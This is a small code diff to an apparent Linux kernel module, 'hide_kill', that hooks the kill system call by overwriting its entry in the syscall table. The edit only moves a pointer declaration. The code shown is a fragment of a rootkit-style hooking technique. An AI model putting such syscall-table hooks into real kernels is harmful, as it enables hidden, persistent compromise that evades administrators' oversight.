@@ -38,6 +38,7 @@ static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
 
 int hide_kill_init(void)
 {
+    void *new_kill_ptr = &hooked_sys_kill;
     printk(KERN_INFO "[hide_kill] Initializing kill hook.\n");
 
     p_sys_call_table = (unsigned long **)get_sys_call_table();
@@ -52,7 +53,6 @@ int hide_kill_init(void)
     original_sys_kill = (void *)p_sys_call_table[__NR_kill];
 
     // Write our hook function's address to the table
-    void *new_kill_ptr = &hooked_sys_kill;
     if (remap_write_range(&p_sys_call_table[__NR_kill], &new_kill_ptr, sizeof(void *), true)) {
         printk(KERN_ERR "[hide_kill] Failed to hook sys_kill.\n");
         return -EFAULT;
